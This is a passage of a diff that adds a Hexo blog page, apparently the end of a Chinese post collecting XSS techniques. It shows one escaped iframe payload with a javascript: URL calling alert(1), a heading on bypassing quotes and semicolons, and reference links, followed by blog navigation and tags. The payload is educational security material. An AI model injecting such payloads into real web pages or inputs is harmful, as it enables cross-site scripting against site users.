+&lt;iframe src=&quot;javascript://https://domain.com/%250A1?alert(1):0&quot;&gt;</code></pre><h2 id="绕过单双引号分号"><a href="#绕过单双引号分号" class="headerlink" title="绕过单双引号分号"></a>绕过单双引号分号</h2><pre><code>https://xz.aliyun.com/t/4010</code></pre><p>参考：<a href="https://xz.aliyun.com/t/4414" target="_blank" rel="noopener">https://xz.aliyun.com/t/4414</a><br>参考：<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a><br>参考：<a href="https://xz.aliyun.com/t/4067" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067</a><br>参考：<a href="https://xz.aliyun.com/t/4074#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/4074#toc-1</a>  </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/04/XSS姿势小集/" data-id="ck0l0oh95000apy2ix7pa1bwj" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/03/09/aes加密的安全问题/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          aes加密的安全问题
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/03/哈希长度拓展攻击/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">哈希长度拓展攻击</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
